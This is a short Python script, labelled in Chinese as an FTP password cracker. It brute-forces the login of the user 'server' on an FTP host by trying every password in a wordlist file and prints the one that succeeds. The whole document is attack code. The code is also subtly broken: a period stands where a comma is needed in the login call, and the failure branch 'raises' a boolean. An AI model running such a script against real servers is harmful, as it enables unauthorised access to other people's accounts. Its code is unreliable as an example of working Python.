from ftplib import FTP 


""" FTP密码破解"""
wordlist = open("wordlist.txt", "r")
user_login = "server"


def getpassword(password):
	try:
		ftp = FTP("server")
		ftp.login(user_login. password)
		print("password:" + password)
		return True
	except Exception:
		raise False


passwords = wordlist.readlines()
for password in passwords:
	password = password.strip()
	if (getpassword(password)):
		break
wordlist.close()